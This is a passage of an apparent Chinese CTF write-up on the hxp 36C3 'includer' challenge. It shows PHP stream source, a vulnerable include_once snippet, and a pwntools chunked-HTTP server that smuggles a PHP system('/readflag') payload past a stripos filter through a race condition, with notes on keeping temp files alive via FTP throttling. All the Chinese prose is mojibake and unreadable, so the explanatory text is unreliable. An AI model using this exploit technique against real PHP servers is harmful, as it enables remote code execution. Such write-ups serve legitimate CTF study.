class="literal">true</span><span class="comment">/* Use a tmpfile and copy the old streams contents into it */</span></span><br><span class="line"></span><br><span class="line">trueif (flags &amp; PHP_STREAM_PREFER_STDIO) &#123;</span><br><span class="line">truetrue*newstream = php_stream_fopen_tmpfile();</span><br><span class="line"><span class="literal">true</span>&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">truetrue*newstream = php_stream_temp_new();</span><br><span class="line"><span class="literal">true</span>&#125;</span><br><span class="line"><span class="literal">true</span><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br></pre></td></tr></table></figure>

<h6 id="æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœflagsä¸PHP-STREAM-PREFER-STDIOéƒ½è¢«è®¾ç½®çš„è¯ï¼Œè€ŒPHP-STREAM-PREFER-STDIOåœ¨main-php-streams-hä¸­å·²ç»è¢«defineã€‚"><a href="#æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœflagsä¸PHP-STREAM-PREFER-STDIOéƒ½è¢«è®¾ç½®çš„è¯ï¼Œè€ŒPHP-STREAM-PREFER-STDIOåœ¨main-php-streams-hä¸­å·²ç»è¢«defineã€‚" class="headerlink" title="æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœflagsä¸PHP_STREAM_PREFER_STDIOéƒ½è¢«è®¾ç½®çš„è¯ï¼Œè€ŒPHP_STREAM_PREFER_STDIOåœ¨main/php_streams.hä¸­å·²ç»è¢«defineã€‚"></a>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœ<code>flags</code>ä¸<code>PHP_STREAM_PREFER_STDIO</code>éƒ½è¢«è®¾ç½®çš„è¯ï¼Œè€Œ<code>PHP_STREAM_PREFER_STDIO</code>åœ¨<code>main/php_streams.h</code>ä¸­å·²ç»è¢«defineã€‚</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHP_STREAM_PREFER_STDIO		1</span></span><br></pre></td></tr></table></figure>

<h6 id="æˆ‘ä»¬åªéœ€è¦å…³å¿ƒflagsçš„å€¼å°±å¥½äº†ï¼Œæˆ‘ä»¬åªéœ€è¦ç¡®å®šflagsçš„å€¼éé›¶å³å¯ï¼Œæ ¹æ®å‰é¢çš„è·Ÿè¿›æˆ‘ä»¬æ˜“çŸ¥flagsçš„åœ¨è¿™é‡Œéé›¶ï¼Œæ‰€ä»¥è¿™é‡Œå°±è°ƒç”¨äº†php-stream-fopen-tmpfileå‡½æ•°åˆ›å»ºäº†ä¸´æ—¶æ–‡ä»¶ã€‚"><a href="#æˆ‘ä»¬åªéœ€è¦å…³å¿ƒflagsçš„å€¼å°±å¥½äº†ï¼Œæˆ‘ä»¬åªéœ€è¦ç¡®å®šflagsçš„å€¼éé›¶å³å¯ï¼Œæ ¹æ®å‰é¢çš„è·Ÿè¿›æˆ‘ä»¬æ˜“çŸ¥flagsçš„åœ¨è¿™é‡Œéé›¶ï¼Œæ‰€ä»¥è¿™é‡Œå°±è°ƒç”¨äº†php-stream-fopen-tmpfileå‡½æ•°åˆ›å»ºäº†ä¸´æ—¶æ–‡ä»¶ã€‚" class="headerlink" title="æˆ‘ä»¬åªéœ€è¦å…³å¿ƒflagsçš„å€¼å°±å¥½äº†ï¼Œæˆ‘ä»¬åªéœ€è¦ç¡®å®šflagsçš„å€¼éé›¶å³å¯ï¼Œæ ¹æ®å‰é¢çš„è·Ÿè¿›æˆ‘ä»¬æ˜“çŸ¥flagsçš„åœ¨è¿™é‡Œéé›¶ï¼Œæ‰€ä»¥è¿™é‡Œå°±è°ƒç”¨äº†php_stream_fopen_tmpfileå‡½æ•°åˆ›å»ºäº†ä¸´æ—¶æ–‡ä»¶ã€‚"></a>æˆ‘ä»¬åªéœ€è¦å…³å¿ƒflagsçš„å€¼å°±å¥½äº†ï¼Œæˆ‘ä»¬åªéœ€è¦ç¡®å®šflagsçš„å€¼éé›¶å³å¯ï¼Œæ ¹æ®å‰é¢çš„è·Ÿè¿›æˆ‘ä»¬æ˜“çŸ¥flagsçš„åœ¨è¿™é‡Œéé›¶ï¼Œæ‰€ä»¥è¿™é‡Œå°±è°ƒç”¨äº†<code>php_stream_fopen_tmpfile</code>å‡½æ•°åˆ›å»ºäº†ä¸´æ—¶æ–‡ä»¶ã€‚</h6><h6 id="äºæ˜¯æˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªç®€å•çš„éªŒè¯ï¼Œåœ¨æœ¬æœºä¸Šè·‘æºä»£ç ï¼Œå¹¶ç”¨pwntoolsèµ·ä¸€ä¸ªæœåŠ¡ç”¨æ¥å‘é€ä¸€ä¸ªå¤§æ–‡ä»¶"><a href="#äºæ˜¯æˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªç®€å•çš„éªŒè¯ï¼Œåœ¨æœ¬æœºä¸Šè·‘æºä»£ç ï¼Œå¹¶ç”¨pwntoolsèµ·ä¸€ä¸ªæœåŠ¡ç”¨æ¥å‘é€ä¸€ä¸ªå¤§æ–‡ä»¶" class="headerlink" title="äºæ˜¯æˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªç®€å•çš„éªŒè¯ï¼Œåœ¨æœ¬æœºä¸Šè·‘æºä»£ç ï¼Œå¹¶ç”¨pwntoolsèµ·ä¸€ä¸ªæœåŠ¡ç”¨æ¥å‘é€ä¸€ä¸ªå¤§æ–‡ä»¶"></a>äºæ˜¯æˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªç®€å•çš„éªŒè¯ï¼Œåœ¨æœ¬æœºä¸Šè·‘æºä»£ç ï¼Œå¹¶ç”¨pwntoolsèµ·ä¸€ä¸ªæœåŠ¡ç”¨æ¥å‘é€ä¸€ä¸ªå¤§æ–‡ä»¶</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_chunk</span><span class="params">(l, data)</span>:</span></span><br><span class="line">    l.send(<span class="string">'''&#123;&#125;\r</span></span><br><span class="line"><span class="string">&#123;&#125;\r</span></span><br><span class="line"><span class="string">'''</span>.format(hex(len(data))[<span class="number">2</span>:], data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    l = listen(<span class="number">9999</span>)</span><br><span class="line">    l.wait_for_connection()</span><br><span class="line"></span><br><span class="line">    data1 = <span class="string">''</span>.ljust(<span class="number">1024</span> * <span class="number">8</span>, <span class="string">'X'</span>)</span><br><span class="line">    data2 = <span class="string">'&lt;?php system("/readflag"); exit(); /*'</span>.ljust(<span class="number">1024</span> * <span class="number">8</span>, <span class="string">'b'</span>)</span><br><span class="line">    data3 = <span class="string">'c*/'</span>.rjust(<span class="number">1024</span> * <span class="number">8</span>, <span class="string">'c'</span>)</span><br><span class="line"></span><br><span class="line">    l.recvuntil(<span class="string">'\r\n\r\n'</span>)</span><br><span class="line">    l.send(<span class="string">'''HTTP/1.1 200 OK\r</span></span><br><span class="line"><span class="string">Content-Type: exploit/revxakep\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Transfer-Encoding: chunked\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data1)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'waiting...'</span>)</span><br><span class="line">    print(<span class="string">'sending php code...'</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data2)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data3)</span><br><span class="line"></span><br><span class="line">    l.send(<span class="string">'''0\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">    l.close()</span><br></pre></td></tr></table></figure>

<h6 id="è¿™æ ·æˆ‘åœ¨æœ¬æœºä¸Šç”¨fswatchå¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°ä¸´æ—¶æ–‡ä»¶å·²ç»ç”Ÿæˆï¼Œå¹¶ä¸”æ–‡ä»¶å†…å®¹å°±æ˜¯æˆ‘ä»¬å‘é€çš„å†…å®¹ã€‚"><a href="#è¿™æ ·æˆ‘åœ¨æœ¬æœºä¸Šç”¨fswatchå¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°ä¸´æ—¶æ–‡ä»¶å·²ç»ç”Ÿæˆï¼Œå¹¶ä¸”æ–‡ä»¶å†…å®¹å°±æ˜¯æˆ‘ä»¬å‘é€çš„å†…å®¹ã€‚" class="headerlink" title="è¿™æ ·æˆ‘åœ¨æœ¬æœºä¸Šç”¨fswatchå¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°ä¸´æ—¶æ–‡ä»¶å·²ç»ç”Ÿæˆï¼Œå¹¶ä¸”æ–‡ä»¶å†…å®¹å°±æ˜¯æˆ‘ä»¬å‘é€çš„å†…å®¹ã€‚"></a>è¿™æ ·æˆ‘åœ¨æœ¬æœºä¸Šç”¨fswatchå¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°ä¸´æ—¶æ–‡ä»¶å·²ç»ç”Ÿæˆï¼Œå¹¶ä¸”æ–‡ä»¶å†…å®¹å°±æ˜¯æˆ‘ä»¬å‘é€çš„å†…å®¹ã€‚</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-1.png" alt></p>
<h6 id="Keep-Temp-File"><a href="#Keep-Temp-File" class="headerlink" title="Keep Temp File"></a>Keep Temp File</h6><h6 id="ä¸´æ—¶æ–‡ä»¶ç»ˆç©¶è¿˜æ˜¯ä¼šè¢«phpåˆ é™¤æ‰çš„ï¼Œå¦‚æœæˆ‘ä»¬è¦è¿›è¡ŒåŒ…å«çš„è¯ï¼Œå°±éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è®©ä¸´æ—¶æ–‡ä»¶å°½å¯èƒ½ä¹…çš„ç•™åœ¨æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·æˆ‘ä»¬æ‰æœ‰æœºä¼šå»åŒ…å«å®ƒã€‚"><a href="#ä¸´æ—¶æ–‡ä»¶ç»ˆç©¶è¿˜æ˜¯ä¼šè¢«phpåˆ é™¤æ‰çš„ï¼Œå¦‚æœæˆ‘ä»¬è¦è¿›è¡ŒåŒ…å«çš„è¯ï¼Œå°±éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è®©ä¸´æ—¶æ–‡ä»¶å°½å¯èƒ½ä¹…çš„ç•™åœ¨æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·æˆ‘ä»¬æ‰æœ‰æœºä¼šå»åŒ…å«å®ƒã€‚" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶ç»ˆç©¶è¿˜æ˜¯ä¼šè¢«phpåˆ é™¤æ‰çš„ï¼Œå¦‚æœæˆ‘ä»¬è¦è¿›è¡ŒåŒ…å«çš„è¯ï¼Œå°±éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è®©ä¸´æ—¶æ–‡ä»¶å°½å¯èƒ½ä¹…çš„ç•™åœ¨æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·æˆ‘ä»¬æ‰æœ‰æœºä¼šå»åŒ…å«å®ƒã€‚"></a>ä¸´æ—¶æ–‡ä»¶ç»ˆç©¶è¿˜æ˜¯ä¼šè¢«phpåˆ é™¤æ‰çš„ï¼Œå¦‚æœæˆ‘ä»¬è¦è¿›è¡ŒåŒ…å«çš„è¯ï¼Œå°±éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è®©ä¸´æ—¶æ–‡ä»¶å°½å¯èƒ½ä¹…çš„ç•™åœ¨æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·æˆ‘ä»¬æ‰æœ‰æœºä¼šå»åŒ…å«å®ƒã€‚</h6><h6 id="æ‰€ä»¥è¿™é‡Œæ˜¯æˆ‘ä»¬éœ€è¦ç«äº‰çš„ç¬¬ä¸€ä¸ªç‚¹ï¼ŒåŸºæœ¬ä¸Šæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•è®©å®ƒåœç•™æ¯”è¾ƒä¹…çš„æ—¶é—´ï¼š"><a href="#æ‰€ä»¥è¿™é‡Œæ˜¯æˆ‘ä»¬éœ€è¦ç«äº‰çš„ç¬¬ä¸€ä¸ªç‚¹ï¼ŒåŸºæœ¬ä¸Šæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•è®©å®ƒåœç•™æ¯”è¾ƒä¹…çš„æ—¶é—´ï¼š" class="headerlink" title="æ‰€ä»¥è¿™é‡Œæ˜¯æˆ‘ä»¬éœ€è¦ç«äº‰çš„ç¬¬ä¸€ä¸ªç‚¹ï¼ŒåŸºæœ¬ä¸Šæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•è®©å®ƒåœç•™æ¯”è¾ƒä¹…çš„æ—¶é—´ï¼š"></a>æ‰€ä»¥è¿™é‡Œæ˜¯æˆ‘ä»¬éœ€è¦ç«äº‰çš„ç¬¬ä¸€ä¸ªç‚¹ï¼ŒåŸºæœ¬ä¸Šæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•è®©å®ƒåœç•™æ¯”è¾ƒä¹…çš„æ—¶é—´ï¼š</h6><ul>
<li>ä½¿ç”¨å¤§æ–‡ä»¶ä¼ è¾“ï¼Œè¿™æ ·åœ¨ä¼ è¾“çš„æ—¶å€™å°±ä¼šæœ‰ä¸€å®šçš„æ—¶é—´è®©æˆ‘ä»¬åŒ…å«åˆ°æ–‡ä»¶äº†ã€‚</li>
<li>ä½¿ç”¨FTPé€Ÿåº¦æ§åˆ¶ï¼Œå¤§æ–‡ä»¶ä¼ è¾“åŸºæœ¬ä¸Šè¿˜æ˜¯ä¼ è¾“é€Ÿåº¦çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ–¹å¼é™åˆ¶ä¼ è¾“é€Ÿç‡ï¼Œæ¯”è¾ƒç®€å•çš„ä¹Ÿå¯ä»¥åˆ©ç”¨<code>compress.zlib://ftp://</code>å½¢å¼ï¼Œæ§åˆ¶FTPé€Ÿåº¦å³å¯</li>
</ul>
<h6 id="Bypass-Waf"><a href="#Bypass-Waf" class="headerlink" title="Bypass Waf"></a>Bypass Waf</h6><h6 id="æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦çœ‹å¦‚ä½•æ¥å¯¹å…³é”®åœ°æ–¹è¿›è¡Œç»•è¿‡äº†ã€‚"><a href="#æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦çœ‹å¦‚ä½•æ¥å¯¹å…³é”®åœ°æ–¹è¿›è¡Œç»•è¿‡äº†ã€‚" class="headerlink" title="æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦çœ‹å¦‚ä½•æ¥å¯¹å…³é”®åœ°æ–¹è¿›è¡Œç»•è¿‡äº†ã€‚"></a>æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦çœ‹å¦‚ä½•æ¥å¯¹å…³é”®åœ°æ–¹è¿›è¡Œç»•è¿‡äº†ã€‚</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (stripos(file_get_contents($_POST[<span class="string">'file'</span>]), <span class="string">'&lt;?'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">include_once</span>($_POST[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="è¿™ä¸ªåœ°æ–¹é—®äº†å¾ˆå¤šå¸ˆå‚…ï¼Œå¹¶ä¸”å‚è€ƒäº†ä¸»è¦çš„å…¬å¼€WPï¼ŒåŸºæœ¬éƒ½æ˜¯åˆ©ç”¨ä¸¤ä¸ªå‡½æ•°ä¹‹é—´æç«¯çš„æ—¶é—´çª—è¿›è¡Œç»•è¿‡ã€‚"><a href="#è¿™ä¸ªåœ°æ–¹é—®äº†å¾ˆå¤šå¸ˆå‚…ï¼Œå¹¶ä¸”å‚è€ƒäº†ä¸»è¦çš„å…¬å¼€WPï¼ŒåŸºæœ¬éƒ½æ˜¯åˆ©ç”¨ä¸¤ä¸ªå‡½æ•°ä¹‹é—´æç«¯çš„æ—¶é—´çª—è¿›è¡Œç»•è¿‡ã€‚" class="headerlink" title="è¿™ä¸ªåœ°æ–¹é—®äº†å¾ˆå¤šå¸ˆå‚…ï¼Œå¹¶ä¸”å‚è€ƒäº†ä¸»è¦çš„å…¬å¼€WPï¼ŒåŸºæœ¬éƒ½æ˜¯åˆ©ç”¨ä¸¤ä¸ªå‡½æ•°ä¹‹é—´æç«¯çš„æ—¶é—´çª—è¿›è¡Œç»•è¿‡ã€‚"></a>è¿™ä¸ªåœ°æ–¹é—®äº†å¾ˆå¤šå¸ˆå‚…ï¼Œå¹¶ä¸”å‚è€ƒäº†ä¸»è¦çš„å…¬å¼€WPï¼ŒåŸºæœ¬éƒ½æ˜¯åˆ©ç”¨ä¸¤ä¸ªå‡½æ•°ä¹‹é—´æç«¯çš„æ—¶é—´çª—è¿›è¡Œç»•è¿‡ã€‚</h6><h6 id="ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æå…¶ç†æƒ³çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é€šè¿‡è‡ªå·±çš„æœåŠ¡å…ˆå‘é€ä¸€æ®µåƒåœ¾æ•°æ®ï¼Œè¿™æ—¶å€™é€šè¿‡striposçš„åˆ¤æ–­å°±æ˜¯æ²¡æœ‰PHPä»£ç çš„æ–‡ä»¶æ•°æ®ï¼Œæ¥ç€æˆ‘ä»¬åˆ©ç”¨HTTPé•¿é“¾æ¥çš„å½¢å¼ï¼Œåªè¦è¿™ä¸ªé“¾æ¥ä¸æ–­å¼€ï¼Œåœ¨æˆ‘ä»¬ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘é€ç¬¬äºŒæ®µå«æœ‰PHPä»£ç çš„æ•°æ®äº†ï¼Œè¿™æ ·å°±èƒ½ä½¿include-onceåŒ…å«æˆ‘ä»¬çš„ä»£ç äº†ã€‚"><a href="#ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æå…¶ç†æƒ³çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é€šè¿‡è‡ªå·±çš„æœåŠ¡å…ˆå‘é€ä¸€æ®µåƒåœ¾æ•°æ®ï¼Œè¿™æ—¶å€™é€šè¿‡striposçš„åˆ¤æ–­å°±æ˜¯æ²¡æœ‰PHPä»£ç çš„æ–‡ä»¶æ•°æ®ï¼Œæ¥ç€æˆ‘ä»¬åˆ©ç”¨HTTPé•¿é“¾æ¥çš„å½¢å¼ï¼Œåªè¦è¿™ä¸ªé“¾æ¥ä¸æ–­å¼€ï¼Œåœ¨æˆ‘ä»¬ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘é€ç¬¬äºŒæ®µå«æœ‰PHPä»£ç çš„æ•°æ®äº†ï¼Œè¿™æ ·å°±èƒ½ä½¿include-onceåŒ…å«æˆ‘ä»¬çš„ä»£ç äº†ã€‚" class="headerlink" title="ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æå…¶ç†æƒ³çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é€šè¿‡è‡ªå·±çš„æœåŠ¡å…ˆå‘é€ä¸€æ®µåƒåœ¾æ•°æ®ï¼Œè¿™æ—¶å€™é€šè¿‡striposçš„åˆ¤æ–­å°±æ˜¯æ²¡æœ‰PHPä»£ç çš„æ–‡ä»¶æ•°æ®ï¼Œæ¥ç€æˆ‘ä»¬åˆ©ç”¨HTTPé•¿é“¾æ¥çš„å½¢å¼ï¼Œåªè¦è¿™ä¸ªé“¾æ¥ä¸æ–­å¼€ï¼Œåœ¨æˆ‘ä»¬ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘é€ç¬¬äºŒæ®µå«æœ‰PHPä»£ç çš„æ•°æ®äº†ï¼Œè¿™æ ·å°±èƒ½ä½¿include_onceåŒ…å«æˆ‘ä»¬çš„ä»£ç äº†ã€‚"></a>ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æå…¶ç†æƒ³çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é€šè¿‡è‡ªå·±çš„æœåŠ¡å…ˆå‘é€ä¸€æ®µåƒåœ¾æ•°æ®ï¼Œè¿™æ—¶å€™é€šè¿‡<code>stripos</code>çš„åˆ¤æ–­å°±æ˜¯æ²¡æœ‰PHPä»£ç çš„æ–‡ä»¶æ•°æ®ï¼Œæ¥ç€æˆ‘ä»¬åˆ©ç”¨HTTPé•¿é“¾æ¥çš„å½¢å¼ï¼Œåªè¦è¿™ä¸ªé“¾æ¥ä¸æ–­å¼€ï¼Œåœ¨æˆ‘ä»¬ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘é€ç¬¬äºŒæ®µå«æœ‰PHPä»£ç çš„æ•°æ®äº†ï¼Œè¿™æ ·å°±èƒ½ä½¿<code>include_once</code>åŒ…å«æˆ‘ä»¬çš„ä»£ç äº†ã€‚</h6><h6 id="å› ä¸ºæˆ‘ä»¬æ— æ³•çŸ¥é“ä»€ä¹ˆæ—¶å€™èƒ½ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ–¹æ³•åªèƒ½åˆ©ç”¨ç«äº‰çš„å½¢å¼å»åŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯ç¬¬äºŒä¸ªæˆ‘ä»¬éœ€è¦ç«äº‰çš„ç‚¹ã€‚"><a href="#å› ä¸ºæˆ‘ä»¬æ— æ³•çŸ¥é“ä»€ä¹ˆæ—¶å€™èƒ½ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ–¹æ³•åªèƒ½åˆ©ç”¨ç«äº‰çš„å½¢å¼å»åŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯ç¬¬äºŒä¸ªæˆ‘ä»¬éœ€è¦ç«äº‰çš„ç‚¹ã€‚" class="headerlink" title="å› ä¸ºæˆ‘ä»¬æ— æ³•çŸ¥é“ä»€ä¹ˆæ—¶å€™èƒ½ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ–¹æ³•åªèƒ½åˆ©ç”¨ç«äº‰çš„å½¢å¼å»åŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯ç¬¬äºŒä¸ªæˆ‘ä»¬éœ€è¦ç«äº‰çš„ç‚¹ã€‚"></a>å› ä¸ºæˆ‘ä»¬æ— æ³•çŸ¥é“ä»€ä¹ˆæ—¶å€™èƒ½ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ–¹æ³•åªèƒ½åˆ©ç”¨ç«äº‰çš„å½¢å¼å»åŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯ç¬¬äºŒä¸ªæˆ‘ä»¬éœ€è¦ç«äº‰çš„ç‚¹ã€‚</h6><h6 id="Leak-Dir-path"><a href="#Leak-Dir-path" class="headerlink" title="Leak Dir path"></a>Leak Dir path</h6><h6 id="æœ€åï¼Œè¦åšåˆ°æ–‡ä»¶åŒ…å«ï¼Œè‡ªç„¶å¾—å…ˆçŸ¥é“å®ƒçš„æ–‡ä»¶è·¯å¾„ï¼Œè€Œæ–‡ä»¶è·¯å¾„æ¯æ¬¡éƒ½æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆä¸å¾—ä¸é€šè¿‡æŸäº›æ–¹å¼å»è·å–è·¯å¾„ã€‚"><a href="#æœ€åï¼Œè¦åšåˆ°æ–‡ä»¶åŒ…å«ï¼Œè‡ªç„¶å¾—å…ˆçŸ¥é“å®ƒçš„æ–‡ä»¶è·¯å¾„ï¼Œè€Œæ–‡ä»¶è·¯å¾„æ¯æ¬¡éƒ½æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆä¸å¾—ä¸é€šè¿‡æŸäº›æ–¹å¼å»è·å–è·¯å¾„ã€‚" class="headerlink" title="æœ€åï¼Œè¦åšåˆ°æ–‡ä»¶åŒ…å«ï¼Œè‡ªç„¶å¾—å…ˆçŸ¥é“å®ƒçš„æ–‡ä»¶è·¯å¾„ï¼Œè€Œæ–‡ä»¶è·¯å¾„æ¯æ¬¡éƒ½æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆä¸å¾—ä¸é€šè¿‡æŸäº›æ–¹å¼å»è·å–è·¯å¾„ã€‚"></a>æœ€åï¼Œè¦åšåˆ°æ–‡ä»¶åŒ…å«ï¼Œè‡ªç„¶å¾—å…ˆçŸ¥é“å®ƒçš„æ–‡ä»¶è·¯å¾„ï¼Œè€Œæ–‡ä»¶è·¯å¾„æ¯æ¬¡éƒ½æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆä¸å¾—ä¸é€šè¿‡æŸäº›æ–¹å¼å»è·å–è·¯å¾„ã€‚</h6><h6 id="è™½ç„¶æˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹åˆ°é¢˜ç›®æ˜¯ç›´æ¥ç»™å‡ºäº†è·¯å¾„ï¼Œä½†æ˜¯ä¹ä¸€çœ‹ä»£ç æˆ‘ä»¬è²Œä¼¼åªèƒ½ç­‰åˆ°å…¨éƒ¨å‡½æ•°ç»“æŸä¹‹åæ‰èƒ½æ‹¿åˆ°è·¯å¾„ï¼Œç„¶è€Œä¹‹å‰æˆ‘ä»¬è¯´åˆ°çš„éœ€è¦ä¿ç•™çš„é•¿é“¾æ¥ä¸èƒ½è®©æˆ‘ä»¬ç«‹å³å¾—åˆ°æˆ‘ä»¬çš„sandboxè·¯å¾„ã€‚"><a href="#è™½ç„¶æˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹åˆ°é¢˜ç›®æ˜¯ç›´æ¥ç»™å‡ºäº†è·¯å¾„ï¼Œä½†æ˜¯ä¹ä¸€çœ‹ä»£ç æˆ‘ä»¬è²Œä¼¼åªèƒ½ç­‰åˆ°å…¨éƒ¨å‡½æ•°ç»“æŸä¹‹åæ‰èƒ½æ‹¿åˆ°è·¯å¾„ï¼Œç„¶è€Œä¹‹å‰æˆ‘ä»¬è¯´åˆ°çš„éœ€è¦ä¿ç•™çš„é•¿é“¾æ¥ä¸èƒ½è®©æˆ‘ä»¬ç«‹å³å¾—åˆ°æˆ‘ä»¬çš„sandboxè·¯å¾„ã€‚" class="headerlink" title="è™½ç„¶æˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹åˆ°é¢˜ç›®æ˜¯ç›´æ¥ç»™å‡ºäº†è·¯å¾„ï¼Œä½†æ˜¯ä¹ä¸€çœ‹ä»£ç 